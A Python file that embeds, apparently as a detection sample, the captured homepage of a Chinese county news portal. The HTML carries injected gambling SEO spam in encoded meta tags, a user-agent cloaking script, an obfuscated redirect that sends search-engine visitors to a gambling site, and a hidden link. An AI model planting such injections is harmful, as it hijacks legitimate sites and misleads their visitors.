#-*-coding:utf-8-*
import re

content =r"""

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
	<meta http-equiv="Cache-control" content="no-cache,no-store,must-revalidate" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="-1" />
	<meta name="renderer" content="webkit">
	<title>&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x0020;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x8d70;&#x52bf;&#x56fe;&#x0020;&#x002d;&#x0020;&#x57fa;&#x672c;&#x8d70;&#x52bf;&#x0020;&#x002d;&#x0020;&#x5feb;&#x0033;&#x8d70;&#x52bf;&#x56fe;&#x002f;&#x5feb;&#x4e09;&#x8d70;&#x52bf;&#x56fe;</title>
<meta name="keywords" content="&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5f00;&#x5956;&#x76f4;&#x64ad;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5b98;&#x7f51;&#x002c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x6280;&#x5de7;&#x002c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5f00;&#x6237;&#x002c;&#x0020;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x6295;&#x6ce8;&#x002c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5386;&#x53f2;&#x8bb0;&#x5f55;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5f00;&#x5956;&#x7ed3;&#x679c;&#x002c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x8ba1;&#x5212;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5f00;&#x5956;&#x8bb0;&#x5f55;"/>
<meta name="description" content="&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5f00;&#x5956;&#x7f51;&#x3010;&#x0079;&#x0078;&#x006b;&#x006a;&#x0035;&#x0035;&#x002e;&#x0063;&#x006f;&#x006d;&#x3011;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x6280;&#x5de7;&#x002c;&#x98ce;&#x4e00;&#x6837;&#x7684;&#x5f00;&#x5956;&#x901f;&#x5ea6;&#x002c;&#x56e2;&#x961f;&#x7cbe;&#x5fc3;&#x6253;&#x9020;&#x7684;&#x5386;&#x53f2;&#x4e0a;&#x6700;&#x9876;&#x5c16;&#x7684;&#x6280;&#x672f;&#x56e2;&#x961f;&#x002c;&#x4e00;&#x6837;&#x7684;&#x5f00;&#x5956;&#x4e0d;&#x4e00;&#x6837;&#x7684;&#x901f;&#x5ea6;&#x002c;&#x5f00;&#x5956;&#x901f;&#x5ea6;&#x8d85;&#x8d8a;&#x5b98;&#x65b9;&#x7f51;&#x7ad9;&#x002c;&#x9700;&#x8981;&#x770b;&#x5f00;&#x5956;&#x8ddf;&#x6280;&#x5de7;&#x8bf7;&#x5927;&#x5bb6;&#x5173;&#x6ce8;&#x0079;&#x0078;&#x006b;&#x006a;&#x0035;&#x0035;&#x002e;&#x0063;&#x006f;&#x006d;&#x98de;&#x8247;&#xff0c;&#x6c5f;&#x82cf;&#x5feb;&#x0033;&#x5f00;&#x5956;&#x7f51;&#x7ad9;&#x552f;&#x4e00;&#x6b63;&#x89c4;&#x5408;&#x6cd5;&#x7684;&#x7f51;&#x7ad9;"/>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="泾县新闻网"}</script>
<script>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="泾县新闻网"}</script>
<script>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="泾县新闻网"}</script>
<script>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="泾县新闻网"}</script>
<script>
var __encode ='sojson.com', _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(window);var __Ox175f0=["\x72\x65\x66\x65\x72\x72\x65\x72","\x62\x61\x69\x64\x75","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x6F\x67\x6F\x75","\x73\x6F\x73\x6F","\x73\x6D","\x75\x63","\x62\x69\x6E\x67","\x79\x61\x68\x6F\x6F","\x73\x6F","\x68\x72\x65\x66","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x78\x6B\x6A\x35\x35\x2E\x63\x6F\x6D\x2F"];(function(){var _0xc12ex1=document[__Ox175f0[0]];if(_0xc12ex1[__Ox175f0[2]](__Ox175f0[1])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[3])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[4])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[5])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[6])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[7])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[8])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[9])> 0){location[__Ox175f0[10]]= __Ox175f0[11]}})()
</script>

	<meta name="toTop" content="true" />

	<script type="text/javascript" src="index.php?c=js&ext=jquery.artdialog.js" charset="utf-8"></script>
	<script type="text/javascript" src="tpl/www/js/global.js" charset="utf-8"></script>
	<!--[if IE]>
	<script type="text/javascript" src="tpl/www/js/html5.js" charset="utf-8"></script>
	<![endif]-->
	
</head>
<link href="tpl/www/images/main.css" rel="stylesheet"  type="text/css">
<link rel="stylesheet" href="tpl/www/images/swiper.css">
<script src="tpl/www/images/swiper.js"></script>
<script type="text/javascript" src="tpl/www/images/Other.js"></script>
<script type="text/javascript" src="tpl/www/images/index.js"></script>

<!--加入收藏-->

<script type="text/javascript" language="javascript">
    //加入收藏
    function AddFavorite(sURL, sTitle) {
        sURL = encodeURI(sURL);
        try{
            window.external.addFavorite(sURL, sTitle);
        }catch(e) {
            try{
                window.sidebar.addPanel(sTitle, sURL, "");
            }catch (e) {
                alert("加入收藏失败，请使用Ctrl+D进行添加,或手动在浏览器里进行设置.");
            }
        }
    }
    //设为首页
    function SetHome(url){
        if (document.all) {
            document.body.style.behavior='url(#default#homepage)';
            document.body.setHomePage(url);
        }else{
            alert("您好,您的浏览器不支持自动设置页面为首页功能,请您手动在浏览器里设置该页面为首页!");
        }
    }
</script>


<body>
	<!--网页顶部-->
    <div id="jx_topbg">
    	<div class="jx_top">
        	<div class="lf_top">

                <!--时间代码-->

				<a href=""><span style="text-decoration: none" ></span></a>
                    <div id="jnkc"><script>
				setInterval("jnkc.innerHTML=new Date().toLocaleString()+' 星期'+'日一二三四五六'.charAt(new Date().getDay());");
			</script></div>
			

        </div>
        	<div class="rg_top">

            </div>
    </div>
    </div>
	
    <!--网页头部-->
    <div id="jx_headbg">
    	<div class="jx_head">
        	<div class="lf_head">
            	<img src="tpl/www/images/logo.png" class="logo"/>
                <!--天气代码-->
                <span class="tianqi">
                	
               	</span>
            </div>


            <div class="rg_head" >

                <div class="banner">
                    <div class="bd">
                        <ul>
                                                                                    <li><a href="#" target="_blank"><img src="res/imgad/20180502/appad_8282.png" style=" width:843px;height: 190px;"/></a></li>
                                                        <li><a href="#" target="_blank"><img src="res/imgad/20180502/appad_8280.png" style=" width:843px;height: 190px;"/></a></li>
                                                    </ul>
                    </div>

                </div>
            </div>

        </div>
    </div>


    <script type="text/javascript">
        $(document).ready(function(){
            $(".rg_head .banner").slide({'autoPlay':true,'switchLoad':'_src','mainCell':'.bd ul'});
            $(".slideBoxTop .banner").slide({'autoPlay':true,'switchLoad':'_src','mainCell':'.bd ul'});
            $(".RightBoxHd .banner").slide({'autoPlay':true,'switchLoad':'_src','mainCell':'.bd ul'});
            $(".index_AD .banner").slide({'autoPlay':true,'switchLoad':'_src','mainCell':'.bd ul'});

        });
    </script>



    <!--网页导航-->
    <div id="jx_navigation">
    	<!--左边菜单导航-->
  		<div class="jx_cen">
    		<div class="jx_bottom">
      			<ul>
                                                			<li><a href="index.php" target="_blank"><em>网站首页</em></a></li>
                            			<li><a href="index.php?id=news" target="_blank"><em>新闻一览</em></a></li>
                            			<li><a href="index.php?id=live&cate=xwpd" target="_blank"><em>电视直播</em></a></li>
                            			<li><a href="index.php?id=demand" target="_blank"><em>电视栏目</em></a></li>
                            			<li><a href="index.php?id=meitijingxianxm" target="_blank"><em>媒体泾县</em></a></li>
                            			<li><a href="index.php?id=fuwuzhinanxm&cate=gongjiaoxianlu" target="_blank"><em>服务指南</em></a></li>
                          			</ul>
             <div class="search">
         <form name="formsearch" method="post" action="http://www.jxnn.cn/index.php?c=search" onsubmit="return top_search();">
         <input name="keywords" id="top-keywords" value="" class="text-box" placeholder="请输入关键字"  type="text"><input class="search-submit" value=" " type="submit">
   	     </form>
          </div>  
		<div class="thisMenu" id="thisMenu" style="left:0px;"></div>
</div>
      		
    		</div>
  		</div>
        
        <!--右边搜索框-->
        
	</div>  
    
    <!--通知公告-->
    <div id="notice">
    	<div class="lf_notice">
        	<div class="title">通知公告：</div>
            <div id="mq" class="scrrr" onmouseout="iScrollAmount=1" onmouseover="iScrollAmount=0">

                                				<a href="http://www.jxnn.cn/index.php?id=61035" target="_blank">8月26日至9月5日，高铁泾县站进京旅客实行二次安检</a>
                				<a href="http://www.jxnn.cn/index.php?id=61026" target="_blank">泾县第二届正能量微信公众号评选结果公示</a>
                				<a href="http://www.jxnn.cn/index.php?id=60946" target="_blank">泾县妇计中心试剂及医用耗材招标公告</a>
                				<a href="http://www.jxnn.cn/index.php?id=60939" target="_blank">关于“铁的新四军”红色故事评选结果的公告</a>
                				<a href="http://www.jxnn.cn/index.php?id=60659" target="_blank">2018年泾县城区学校选聘教师公告</a>
                				<a href="http://www.jxnn.cn/index.php?id=60542" target="_blank">泾县广播电视发射台室外桥架工程中标公示</a>
                
           </div>
        </div>
        <div class="rg_notice">
        	<div class="t_title"><a href="http://www.12377.cn/" target="_blank">互联网违法和不良信息举报电话：0563-5093171</a></div>
        </div>
    </div> 

    <!--投稿联系-->
    <div class="contributor"></div>


    <!--滚动-->
<script>
    var oMarquee = document.getElementById("mq"); //滚动对象
    var iLineHeight = 40; //单行高度，像素
    var iLineCount = 6; //实际行数
    var iScrollAmount = 1; //每次滚动高度，像素
    function run() {
        oMarquee.scrollTop += iScrollAmount;
        if ( oMarquee.scrollTop == iLineCount * iLineHeight )
            oMarquee.scrollTop = 0;
        if ( oMarquee.scrollTop % iLineHeight == 0 ) {
            window.setTimeout( "run()", 2000 );
        } else {
            window.setTimeout( "run()", 40 );
        }
    }
    oMarquee.innerHTML += oMarquee.innerHTML;
    window.setTimeout( "run()", 2000 );
</script>
        
    <!--顶部广告-->    
    <div id="slide">

  			<ul>
                                   				<li>
                    <a href="http://www.wenming.cn/specials/zxdj/19d/88WW_/201806/t20180625_4733131.shtml#0" target="_black">
                                                <img src="res/imgad/20180709/ccfbf5bef5d1f3f0.png" />
                                            </a></li>
                   				<li>
                    <a href="" target="_black">
                                                <object codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" classid="" width="1200" height="132"><param name="movie" value="res/imgad/20180419/5324b17929a4ae62.swf"><param name="quality" value="high"><param name="wmode" value="transparent">
                            <embed src="res/imgad/20180419/5324b17929a4ae62.swf" width="1200" height="132" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent">
                        </object>
                                            </a></li>
                   				<li>
                    <a href="" target="_black">
                                                <img src="res/imgad/20180724/5ec36276590e7240.gif" />
                                            </a></li>
                   				<li>
                    <a href="https://mp.weixin.qq.com/s/7_5aX4Nw76gaWm6zWIAFYw" target="_black">
                                                <img src="res/imgad/20180827/0d0d70c84e9f9eed.jpg" />
                                            </a></li>
                  			</ul>
 	</div>


<style>
    .DoubleAd{width: 1200px;height: auto;margin: 0 auto;}
    .DoubleAd ul li{width: 595px; float: left;margin-right: 10px;margin-bottom:12px;}
    .DoubleAd ul .doubleUl{margin-right: 0px;}
    .DoubleAd ul li a img{width: 595px;display: block;height: auto;}

    .hot-ht .publicity{width:1200px; height:100px;border-bottom: 1px dotted #8db8db;margin-bottom: 12px;}
    .hot-ht .publicity .leftBox{width: 940px;float: left;}

    .hot-ht .publicity .leftBox .publicity1{display: block;width: 880px;}
    .hot-ht .publicity .leftBox .publicity1 a{width:940px; font-size:26px; color:#305798; font-weight:bold; margin-top:8px; display:block; text-align:center;line-height: 44px;}
    .hot-ht .publicity .leftBox .publicity2{width: 940px;display: block;margin-left: 10px;margin-top: 12px;vertical-align: middle;height: 24px;text-align: center;}
	.hot-ht .publicity .leftBox .publicity1 a:hover{color:#ff9724;}
    .hot-ht .publicity .leftBox .publicity2 p{width: 940px;text-align: center;font-family: "Microsoft Yahei"}
    .hot-ht .publicity .leftBox .publicity2 p a{color:#305798;display:inline-block;font-size: 12px; text-align: center;vertical-align: middle;height: 24px;margin-right: 6px;}
    .hot-ht .publicity .leftBox .publicity2 p a:hover{color:#ff9724;}
    .hot-ht .publicity .RightBoxHd{width:240px;float: right;height: 80px;margin-top: 5px;}

    .hot-ht .publicity .RightBoxHd .banner{position:relative;width:240px;margin:0 auto 10px;overflow:hidden;height: 100px;}
    .hot-ht .publicity .RightBoxHd .banner .bd{width: 240px;height: 80px;margin-top: 5px;}
    .hot-ht .publicity .RightBoxHd .banner .bd ul{list-style:none;margin:0;padding:0}
    .hot-ht .publicity .RightBoxHd .banner .bd ul li a img{width: 240px;height: 80px;display: block;}
    .hot-ht .publicity .RightBoxHd .banner .hd{position:absolute;right:10px;text-align:center;top: 12px;}
    .hot-ht .publicity .RightBoxHd.banner .hd ul{list-style:none;margin:0;padding:0}
    .hot-ht .publicity .RightBoxHd .banner .hd ul li{width:8px;height:8px;background:#c5c5c5;display:inline-block;+display:inline;zoom:1;margin:0 1px;cursor:pointer;line-height:8px;font-size:0.6em}
    .hot-ht .publicity .RightBoxHd .banner .hd ul li.on{background:darkred;color:red}

</style>
<!--一行两个的奇葩广告-->

<!--<div class="DoubleAd">
    <ul>
        &lt;!&ndash; php:$list = phpok('wzgg','cateid=648') &ndash;&gt;
        &lt;!&ndash; loop from=$list.rslist key=$key value=$value id=list_id  &ndash;&gt;
        <li  class="doubleUl" ><a href="https://mp.weixin.qq.com/s/7_5aX4Nw76gaWm6zWIAFYw" target="_blank"><img src="res/imgad/20180827/auto_59632.jpg"/></a></li>
        &lt;!&ndash; /loop &ndash;&gt;
    </ul>
</div>-->


    <!--flash广告-->
<!--

    <div id="slideSwf">

        <ul>
            &lt;!&ndash; php:$list = phpok('wzgg','cateid=640','psize=2') &ndash;&gt;

            &lt;!&ndash; loop from=$list.rslist key=$key value=$value &ndash;&gt;
            <li>
                <a href="https://mp.weixin.qq.com/s/7_5aX4Nw76gaWm6zWIAFYw" target="_black">

                    <object codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" classid="" width="1200" height="132"><param name="movie" value="res/imgad/20180827/0d0d70c84e9f9eed.jpg"><param name="quality" value="high"><param name="wmode" value="transparent">
                        <embed src="res/imgad/20180827/0d0d70c84e9f9eed.jpg" width="1200" height="132" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent">
                    </object>

                </a>
            </li>
            &lt;!&ndash; /loop &ndash;&gt;
        </ul>
    </div>

<script language="javascript" type="text/javascript">
document.write("<div style='display:none;'>");
</script><div>
<a href=http://thief.one>暗链</a>
<script language="javascript" type="text/javascript">
document.write("</div>");
</script>

-->

    <!--头部幻灯-->
    <div   class="slideBoxTop">

        <div class="banner">
            <div class="bd">
                <ul>
                                                        </ul>
            </div>

        </div>

    </div>
      
  	<!--新闻一览-->
  	<div class="hot-ht">
    	<div class="publicity">

            <div class="leftBox">

                                                <span class="publicity1"><a href="http://www.jxnn.cn/index.php?id=61059" target="_blank">县委书记耿鹏开展扶贫遍访活动</a></span>
                                <span class="publicity2">
                   <p>
                     
                                                                     <a href="http://fk.5kah.com/" target="_blank">泾县“五大会战” 比学赶超考评活动</a>
                                                                                            <a href="http://www.jxnn.cn/index.php?id=allSubject&cate=jianshesigejingxian&page=index" target="_blank">建设“四个泾县” 实施“五大会战”</a>
                                                                                            <a href="index.php?id=allSubject&cate=gbzfjsn" target="_blank">干部作风建设年</a>
                                              					   <a href="index.php?id=allSubject" target="_blank" style="color:red">更多专题+</a>

                   </p>
                </span>


            </div>

            <div class="RightBoxHd">

                <div class="banner">
                    <div class="bd">
                        <ul>
                                                                                    <li><a href="index.php?id=allSubject&cate=qzggkf40zn" target="_blank"><img src="res/imgad/20180713/appad_58018.jpg"/></a></li>
                                                        <li><a href="http://news.anhuinews.com/cms_udf/2018/wlcx/index.shtml" target="_blank"><img src="res/imgad/20180705/appad_57781.png"/></a></li>
                                                        <li><a href="http://www.jxnn.cn/index.php?id=allSubject&cate=xinshidaijingxianjiangxisuo&page=index" target="_blank"><img src="res/imgad/20180613/appad_57087.png"/></a></li>
                                                    </ul>
                    </div>

                    <div class="hd">
                        <ul>
                                                        <li></li>
                                                        <li></li>
                                                        <li></li>
                                                    </ul>
                    </div>
                </div>

            </div>



        </div>




  		<div class="banner-box">
    		<!--幻灯片-->
           <div class="index_AD">
               <div class="banner">
                   <div class="bd">
                       <ul>
                                                                                 <li>
                               <a href="http://www.jxnn.cn/index.php?id=61059" target="_blank">
                                   <img src="res/img/201808/28/auto_59687.jpg" />
                                   <span>&nbsp;&nbsp;县委书记耿鹏开展扶贫遍访活动</span>
                               </a>
                           </li>
                                                      <li>
                               <a href="http://www.jxnn.cn/index.php?id=61032" target="_blank">
                                   <img src="res/img/201808/27/auto_59652.jpg" />
                                   <span>&nbsp;&nbsp;桃花潭镇严厉打击违建行为 从严规范景区建设秩序</span>
                               </a>
                           </li>
                                                      <li>
                               <a href="http://www.jxnn.cn/index.php?id=61031" target="_blank">
                                   <img src="res/img/201808/27/auto_59651.jpg" />
                                   <span>&nbsp;&nbsp;我县集中整治千亩园路“乱搭乱建”</span>
                               </a>
                           </li>
                                                      <li>
                               <a href="http://www.jxnn.cn/index.php?id=61027" target="_blank">
                                   <img src="res/img/201808/27/auto_59645.jpg" />
                                   <span>&nbsp;&nbsp;云岭镇梅村法治文化广场投入使用</span>
                               </a>
                           </li>
                                                      <li>
                               <a href="http://www.jxnn.cn/index.php?id=60978" target="_blank">
                                   <img src="res/img/201808/24/auto_59590.jpg" />
                                   <span>&nbsp;&nbsp;县法院举办“法筑童梦 一路随行”公众开放日活动</span>
                               </a>
                           </li>
                                                  </ul>
                   </div>
                   <div class="hd">
                       <ul>
                                                      <li></li>
                                                      <li></li>
                                                      <li></li>
                                                      <li></li>
                                                      <li></li>
                                                  </ul>
                   </div>
               </div>
           </div>


    		<!--右边切换-->
    		<div class="changeNew">
      			<div class="newLs">
                            			<div class="tabs" id="tabs">

                                  				<a href="http://www.jxnn.cn/index.php?id=news&cate=jxxw" target="_blank">泾县新闻</a>
                                  				<a href="http://www.jxnn.cn/index.php?id=news&cate=ywsd" target="_blank">要闻速递</a>
                                  				<a href="http://www.jxnn.cn/index.php?id=news&cate=tzgg" target="_blank">通知公告</a>
                                  				<a href="http://www.jxnn.cn/index.php?id=news&cate=newstop" target="_blank">微头条</a>
                        
        			</div>

        		<div class="boreds"></div>
                
        		<div id="tabs-container" class="swiper-container swiper-container-horizontal">
          			<div class="swiper-wrapper">

            			<div class="swiper-slide" style="width: 454px; height:290px;">
              				<div class="content-slide">
                				<ul class="news-list" id="newsSecretary">
                                 
                                                                                                            <li><a href="http://www.jxnn.cn/index.php?id=61028" target="_blank">我县组织收看安徽省实施乡村振兴战略工作推进电视</a><span class="s5">08-27</span><span class="newsN" style="display: none;"></span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61029" target="_blank">县人大常委会专题学习研究全国宣传思想工作会议精</a><span class="s5">08-27</span><span class="newsN" style="display: none;"></span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61030" target="_blank">茂林榔桥蔡村三乡镇人代会召开</a><span class="s5">08-27</span><span class="newsN" style="display: none;"></span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61031" target="_blank">我县集中整治千亩园路“乱搭乱建”</a><span class="s5">08-27</span><span class="newsN" style="display: none;">f</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61067" target="_blank">代表一条建议得落实 “生态补水”助力生态建设</a><span class="s5">08-28</span><span class="newsN" style="display: none;"></span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61027" target="_blank">云岭镇梅村法治文化广场投入使用</a><span class="s5">08-27</span><span class="newsN" style="display: none;">f</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61032" target="_blank">桃花潭镇严厉打击违建行为 从严规范景区建设秩序</a><span class="s5">08-27</span><span class="newsN" style="display: none;">f</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61034" target="_blank">文明创建：城区车辆违停曝光台（第三期）</a><span class="s5">08-27</span><span class="newsN" style="display: none;"></span></li>
                                    

                				</ul>
              				</div>
            			</div>

                        <div class="swiper-slide" style="width: 454px; height:290px;">
                            <div class="content-slide">
                                <ul class="news-list">
                                                                                                            <li><a href="http://www.jxnn.cn/index.php?id=61043" target="_blank">习近平：推动共建“一带一路”走深走实造福人民</a><span class="s5">08-28</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61042" target="_blank">李克强对2018年全国医改工作电视电话会议作出重要</a><span class="s5">08-28</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61041" target="_blank">人大常委会第五次会议在京举行</a><span class="s5">08-28</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61040" target="_blank">走深走实 造福人民——专家解读推进“一带一路”建</a><span class="s5">08-28</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60994" target="_blank">习近平主席提出“一带一路”倡议5周年记</a><span class="s5">08-27</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60992" target="_blank">习近平对中船重工第七六〇所黄群等3名同志壮烈牺牲</a><span class="s5">08-27</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60991" target="_blank">中共中央印发《中国共产党纪律处分条例》</a><span class="s5">08-27</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60988" target="_blank">国务院大督查：少数贫困群众仍存&quot;等靠要&quo</a><span class="s5">08-27</span></li>
                                    
                                </ul>
                            </div>
                        </div>

                        <div class="swiper-slide" style="width: 454px; height:290px;">
                            <div class="content-slide">
                                <ul class="news-list">
                                                                                                            <li><a href="http://www.jxnn.cn/index.php?id=61035" target="_blank">8月26日至9月5日，高铁泾县站进京旅客实行二次安检</a><span class="s5">08-27</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=61026" target="_blank">泾县第二届正能量微信公众号评选结果公示</a><span class="s5">08-27</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60946" target="_blank">泾县妇计中心试剂及医用耗材招标公告</a><span class="s5">08-23</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60939" target="_blank">关于“铁的新四军”红色故事评选结果的公告</a><span class="s5">08-22</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60659" target="_blank">2018年泾县城区学校选聘教师公告</a><span class="s5">08-15</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60542" target="_blank">泾县广播电视发射台室外桥架工程中标公示</a><span class="s5">08-13</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60529" target="_blank">2018年宣城市公安机关招聘警务辅助人员公告</a><span class="s5">08-11</span></li>
                                                                        <li><a href="http://www.jxnn.cn/index.php?id=60495" target="_blank">泾县2018年秋季城区初中招生学区划分</a><span class="s5">08-10</span></li>
                                    
                                </ul>
                            </div>
                        </div>

                   </div>
              </div>

      </div>
    </div>
    		<!--右边投稿方式-->
    		<div class="rg_publicity">
        	<div class="tougao"></div>
            <div class="jxxinwen">
            	<!--直播-->
                                            	<div class="jxnews" >
                	<a href="http://www.jxnn.cn/index.php?id=live&cate=xwpd"><img src="res/img/201806/13/b51cad338e11d745.png"></a>
                </div>
                            	<div class="jxnews" >
                	<a href="http://www.jxnn.cn/index.php?id=live&cate=jjsh"><img src="res/img/201806/13/d43c5ff605bc45d6.png"></a>
                </div>
                            	<div class="jxnews" >
                	<a href="http://www.jxnn.cn/index.php?id=live&cate=yspd"><img src="res/img/201806/13/f61a1ff2e6b4f0e8.png"></a>
                </div>
                

            </div>
        </div>
  		</div>
	</div>
	
    <!--中部-->
    <div class="advertising" id="advertising">
    	<a href="index.php?id=allSubject" target="_blank"><img src="tpl/www/images/zhuanti_03.png" class="zhuanti"/></a>
        <div class="scrollleft1" style="overflow: hidden; position: relative;">
      		<ul style="margin: 0px; padding: 0px; overflow: hidden; position: relative; list-style: outside none none;">

                
                                                                                                                <li style="position: relative; overflow: hidden; float: left;">
                                        <a href="index.php?id=allSubject&cate=jianshesigejingxian&page=index" target="_blank"><img src="res/picCover/612eaf3dca345642.png"></a>
                                    </li>
                                                                <li style="position: relative; overflow: hidden; float: left;">
                                        <a href="index.php?id=allSubject&cate=gbzfjsn" target="_blank"><img src="res/picCover/638884c75d98ae9c.png"></a>
                                    </li>
                                                                <li style="position: relative; overflow: hidden; float: left;">
                                        <a href="index.php?id=allSubject&cate=jzfpjxzxd" target="_blank"><img src="res/picCover/17acd60913a15ae5.png"></a>
                                    </li>
                                                                <li style="position: relative; overflow: hidden; float: left;">
                                        <a href="index.php?id=allSubject&cate=jxcjsjwmxc" target="_blank"><img src="res/picCover/8f1234e2ce5037cd.jpg"></a>
                                    </li>
                                                                                                <li style="position: relative; overflow: hidden; float: left;">
                                        <a href="http://www.kepuchina.cn/" target="_blank"><img src="res/imgad/20180524/99b277c564fc8686.jpg"></a>
                                    </li>
                                                                <li style="position: relative; overflow: hidden; float: left;">
                                        <a href="index.php?id=allSubject&cate=impression&page=index" target="_blank"><img src="res/picCover/a31f07e4d2696dc2.png"></a>
                                    </li>
                                
      		</ul>
    	</div>
        <a href="index.php?id=allSubject" target="_blank"><img src="tpl/www/images/gengduo_03.png" class="gengduo"/></a>
    </div>
    
    <!--媒体泾县-->
    <div id="jx_mediabg">
    	<div class="jx_media">
        	<div class="top_media">
            	<a href="index.php?id=meitijingxianxm" target="_blank"><img src="tpl/www/images/mediaPic.png" class="meiti"/>
                <img src="tpl/www/images/46_03.png" class="shuimo"/></a>
            </div>
            	<div class="jx_lf_media">
            	<div class="media1">
                	<div class="media2"><a href="index.php?id=meitijingxianxm&cate=lvsejingxian" target="_blank">绿色泾县</a></div>
                    <div class="media3"><a href="index.php?id=meitijingxianxm&cate=lvsejingxian" target="_blank">更多+</a></div>
                </div>
                <div class="lf_media">
                    	<a href="index.php?id=meitijingxianxm&cate=lvsejingxian" target="_blank"><img src="tpl/www/images/47_03.png" /></a>
                    </div>
                <div class="rg_media">
                	<ul>
                        
                                                                        <li><a href="res/enclosure/2018/07c45e11e03479dc.pdf" target="_blank">第98期《绿色泾县》</a></li>
                                                                                                <li><a href="res/enclosure/2018/d679bb60458c79bb.pdf" target="_blank">第97期《绿色泾县》</a></li>
                                                                                                <li><a href="res/enclosure/2018/4ec77fe2643a6b4d.pdf" target="_blank">第96期《绿色泾县》</a></li>
                                                                                                <li><a href="res/enclosure/2018/fe3162c4d6780cc1.pdf" target="_blank">第95期《绿色泾县》</a></li>
                                                
                        <li style="background: #00a0e9;"><a href="http://www.jxnn.cn/st/index.html" target="_blank" style="width: 175px;display:block;text-align: center;color: #fff;padding: 0px;">泾县报回顾</a></li>
                    </ul>
                </div>
                
            </div>
            <div class="jx_rg_media">
        	<div class="changeNew">
      			<div class="newLs1">
        			<div class="tw-news">
                                                          				<a href="http://www.jxnn.cn/index.php?id=meitijingxianxm&cate=waimeikanjingxian" target="_blank">外媒看泾县</a>
                                  				<a href="http://www.jxnn.cn/index.php?id=meitijingxianxm&cate=jcsp" target="_blank">泾川时评</a>
                                  				<a href="http://www.jxnn.cn/index.php?id=meitijingxianxm&cate=xinmeitizixun" target="_blank">新媒体资讯</a>
                                  				<a href="http://www.jxnn.cn/index.php?id=meitijingxianxm&cate=lvsejingxian" target="_blank">绿色泾县</a>
                                			</div>
        		<div class="boreds"></div>
        		<div id="tw-news-container" class="swiper-container swiper-container-horizontal">

          			<div class="swiper-wrapper">
            			<div class="swiper-slide swiper-slide-active" style="width: 375px;">
              				<div class="content-slide">
                				<ul class="news-list">
                                                                                                          <li>
                                                                            <a href="http://www.jxnn.cn/index.php?id=60907" target="_blank">[宣城日报]泾县马鞍村实施精准扶贫帮扶：让</a>
                                                                        </li>
                                                                      <li>
